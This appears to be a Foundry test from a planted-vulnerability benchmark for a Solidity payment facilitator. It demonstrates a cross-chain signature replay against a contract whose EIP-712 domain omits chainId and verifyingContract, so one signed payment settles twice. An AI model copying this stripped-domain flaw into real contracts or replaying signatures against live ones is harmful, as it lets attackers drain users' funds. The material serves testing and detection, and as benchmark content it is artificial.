// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {V05_CrossDomain, IERC20Minimal} from "src/V05_CrossDomain.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {AuthSigner} from "test/harness/AuthSigner.sol";

/// @notice Planted-leg twin for V05_CrossDomain. Deploys F_A on chainId=1
/// and F_B on chainId=8453 both with defenseOn=false (stripped
/// domain: name + version only, no chainId, no verifyingContract).
/// The payer signs a single payment auth against F_A on chain 1;
/// the attacker replays the same signature against F_B on chain
/// 8453 and drains the payer's allowance a second time. Assertion
/// surfaces `INVARIANT VIOLATED V05_CrossDomain`.
contract V05_CrossDomainPlantedTest is Test {
    MockERC20 internal token;
    V05_CrossDomain internal facilitatorA;
    V05_CrossDomain internal facilitatorB;
    uint256 internal payerPk = 0xA11CE;
    address internal payer;
    address internal recipient = address(0xBEEF);

    function setUp() public {
        token = new MockERC20();
        vm.chainId(1);
        facilitatorA = new V05_CrossDomain(IERC20Minimal(address(token)), false);
        vm.chainId(8453);
        facilitatorB = new V05_CrossDomain(IERC20Minimal(address(token)), false);
        payer = vm.addr(payerPk);
        token.mint(payer, 1_000_000e6);
        vm.prank(payer);
        token.approve(address(facilitatorA), type(uint256).max);
        vm.prank(payer);
        token.approve(address(facilitatorB), type(uint256).max);
    }

    function test_crossChainReplaySurfacesInvariantViolated() public {
        V05_CrossDomain.Auth memory a = V05_CrossDomain.Auth({
            payer: payer,
            recipient: recipient,
            amount: 100e6,
            deadline: block.timestamp + 1 hours,
            nonce: 1
        });

        vm.chainId(1);
        bytes32 d = facilitatorA.digest(a);
        (uint8 v, bytes32 r, bytes32 s) = AuthSigner.sign(payerPk, d);

        // Settle on F_A / chain 1.
        facilitatorA.settle(a, v, r, s);

        // Attacker replays the SAME signature to F_B on chain 8453.
        // Under the stripped domain (planted), F_A and F_B compute the
        // same domain separator (no chainId, no verifyingContract), so
        // ecrecover on F_B yields the payer and the transfer lands
        // again. One signed authorization, two on-chain settlements.
        vm.chainId(8453);
        facilitatorB.settle(a, v, r, s);

        // Invariant: recipient received exactly the amount the payer
        // authorized for the single (facilitator, chain) pair. Planted
        // hunk lets one signature settle across every (facilitator,
        // chain) pair.
        assertEq(
            token.balanceOf(recipient),
            100e6,
            "INVARIANT VIOLATED V05_CrossDomain: one signed authorization settled on multiple (facilitator, chain) pairs"
        );
    }
}
